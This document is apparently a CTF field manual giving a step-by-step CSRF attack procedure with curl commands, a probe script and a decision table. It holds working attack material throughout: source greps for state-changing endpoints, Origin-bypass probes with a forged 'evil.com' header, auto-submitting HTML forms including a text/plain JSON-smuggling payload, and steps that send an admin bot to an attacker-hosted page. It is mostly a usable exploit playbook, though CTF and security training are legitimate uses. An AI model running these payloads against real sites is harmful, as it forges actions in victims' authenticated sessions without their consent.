# Field manual — the operational CSRF procedure

The bounded checklist for a live challenge — the commands, in order,
with the decision each one feeds.

---

## Phase 0 — the setup

```bash
# your own session — the baseline cookie jar
export CJ=/tmp/csrf-cookies.txt
curl -c "$CJ" -X POST "$BASE/login" -d 'u=you&p=pass'
curl -b "$CJ" "$BASE/" -o /dev/null -w '%{http_code}\n'
```

## Phase 1 — the write inventory

```bash
# 1. the state-changing endpoints
grep -rnoE '(post|put|patch|delete|change|update|transfer|set|create|delete|add|edit|role|admin|grant|login|password|email|assign|submit)' \
  <src> | grep -iE 'route|@|app\.|router\.|def |function' | head -40
# 2. the GET-writes — the Lax-open case
grep -rnoE '\.get\(|@.*get|Route::get|def get_' <src> | head -20
# 3. the bot surface
grep -rnoE 'report|visit|admin-bot|puppeteer|playwright|headless' <src> | head -10
# 4. the internal gates
grep -rnoE '127\.0\.0\.1|localhost|remote_ip|RemoteAddr|ClientIP' <src> | head -10
```

## Phase 2 — the gate measurements, in order

```bash
# Gate: which credential + SameSite?
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'

# Gate: token required? strip it.
python3 tools/web/csrf_probe.py --url "$BASE/<ep>" --method POST \
  --body '<fields>' --token-field <f>

# Gate: Origin/Referer read?
curl -i -b "$CJ" -X POST "$BASE/<ep>" -d '<fields>' -H 'Origin: https://evil.com'
curl -i -b "$CJ" -X POST "$BASE/<ep>" -d '<fields>' -H 'Origin:'

# Gate: content-type a form can send?
curl -i -X POST "$BASE/<ep>" -H 'Content-Type: text/plain' --data '{"a":1,"i":"="}' -b "$CJ"
```

## Phase 3 — the decision

```text
SameSite=Strict         → dead for this cookie
Lax + POST-only         → dead via form; a GET write?
Lax + GET write         → top-nav GET form
None+Secure / missing   → full surface
token session-bound     → dead unless broken
token not verified      → strip and send
Origin/Referer enforced → absent/null bypass?
json-only + strict      → dead via form; a sibling?
all open                → build the delivery
```

## Phase 4 — the delivery

```html
<!-- urlencoded -->
<form id=f action="URL" method=POST><input name=a value=1></form>
<script>f.submit()</script>

<!-- text/plain JSON -->
<form id=f action="URL" method=POST enctype=text/plain>
<input name='{"a":"' value='x","i":"'}'></form><script>f.submit()</script>

<!-- GET top-nav -->
<script>location='URL?a=1'</script>
```

## Phase 5 — the bot delivery

```bash
curl -X POST "$BASE/report" -H 'Content-Type: application/json' \
  -d '{"url":"https://attacker/page"}'
# or a data: URL if the bot can't reach your host
curl -X POST "$BASE/report" -H 'Content-Type: application/json' \
  -d '{"url":"data:text/html,<encoded>"}'
```

## Phase 6 — the readback

```bash
# the state-change oracle — poll until the bot cycle lands
for i in $(seq 1 30); do
  curl -s -b "$CJ" "$BASE/api/me" | grep -o 'csrf-marker' && break; sleep 2; done
```

## Phase 7 — the verdict

```bash
# confirms — the marker present
python3 tools/hooks.py post-probe <c> --verdict confirms \
  --hypothesis-id <H> --class web-csrf --evidence-kind impact \
  --evidence 'marker on my object' --response '<body>'
# refutes — a gate held
python3 tools/hooks.py post-probe <c> --verdict refutes \
  --hypothesis-id <H> --class web-csrf --evidence-kind class \
  --evidence '<the gate that held>' --response '<the refusal body>'
```

## Phase 8 — the flag

```bash
# when the flag lands in a readable state
python3 tools/hooks.py pre-flag --value 'FLAG{...}' \
  --source 'GET /api/me' --evidence '<body>'
```

## The budget reminder

```text
5 probes or 15 min per gate-family; 25/45 for the whole challenge.
a spent gate → name which held → change the carrier or accept the
falsifier. escalate via decide.py: chain_match → reclassify →
writeup_search → novel_plan → fanout_sweep → solver_handoff.
```

## The two-card recall — run the matcher first

```bash
python3 tools/chain_match.py --source <dir> --record <name>
# a literal match → the card to read; a family_leads → a hint the
# mechanism exists. read the named card's first_confirming_probe.
```
